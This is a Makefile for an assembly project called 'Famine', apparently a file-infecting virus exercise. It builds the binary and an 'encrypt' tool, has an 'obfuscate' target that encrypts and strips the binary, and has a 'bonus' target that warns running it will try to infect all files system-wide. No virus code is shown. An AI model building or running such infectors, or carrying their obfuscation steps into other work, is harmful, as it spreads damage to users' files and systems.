# Compiler and flags
AS      = nasm
ASFLAGS = -f elf64 -I includes -I sources

ifneq (,$(filter verbose,$(MAKECMDGOALS)))
ASFLAGS += -DVERBOSE_MODE
endif
ifeq ($(V),1)
ASFLAGS += -DVERBOSE_MODE
endif

# Directories
SRC_DIR  = sources
OBJ_DIR  = objects
BIN_DIR  = .
BIN_NAME = Famine
ENCRYPT_NAME = encrypt


# Source files
SRC_S    = sources/main.s
ENCRYPT_S = sources/encrypt.s

# Object files
OBJ_S    = $(patsubst $(SRC_DIR)/%.s,$(OBJ_DIR)/%.o,$(SRC_S))
OBJS     = $(OBJ_S)
ENCRYPT_OBJ = $(OBJ_DIR)/encrypt.o

# Target executables
TARGET   = $(BIN_DIR)/$(BIN_NAME)
ENCRYPT  = $(BIN_DIR)/$(ENCRYPT_NAME)

# Default target - build Famine and encrypt (without auto-running encryption)
all: $(TARGET) $(ENCRYPT)

# Create objects directory if it doesn't exist
$(OBJ_DIR):
	$(shell mkdir -p $(OBJ_DIR))

# Link object files into Famine executable
$(TARGET): $(OBJS)
	ld $^ -o $@

# Compile .s files to .o for Famine
$(OBJ_DIR)/%.o: $(SRC_DIR)/%.s | $(OBJ_DIR)
	$(AS) $(ASFLAGS) $< -o $@


obfuscate: $(TARGET) $(ENCRYPT)
	$(ENCRYPT) $(BIN_NAME)
	strip $(BIN_NAME)

$(ENCRYPT): $(ENCRYPT_OBJ)
	ld $^ -o $@

# Compile encrypt.s
$(ENCRYPT_OBJ): $(ENCRYPT_S) | $(OBJ_DIR)
	$(AS) $(ASFLAGS) $< -o $@

clean:
	rm -rf $(OBJ_DIR)

fclean: clean
	rm -f $(TARGET) $(ENCRYPT)

re: fclean all

test: $(TARGET)
	INSPECT=$(INSPECT_MODE) VERBOSE=$(if $(INSPECT_MODE),1,$(VERBOSE)) ./tests/test_famine.sh $(VERBOSE_FLAG)

bonus: fclean
	mkdir -p $(OBJ_DIR)
	$(AS) $(ASFLAGS) -DBONUS_MODE $(SRC_S) -o $(OBJ_DIR)/main.o
	ld $(OBJ_DIR)/main.o -o $(TARGET)
	$(AS) $(ASFLAGS) $(ENCRYPT_S) -o $(ENCRYPT_OBJ)
	ld $(ENCRYPT_OBJ) -o $(ENCRYPT)
	$(ENCRYPT) $(TARGET)
	@echo "WARNING: About to execute Famine targeting root directory /"
	@echo "Running the famine binary will attempt to infect all files system-wide."

verbose: fclean
	@echo "Building with VERBOSE_MODE enabled..."
	$(MAKE) all MAKECMDGOALS=verbose

inspect:



.PHONY: clean fclean re test bonus inspect verbose
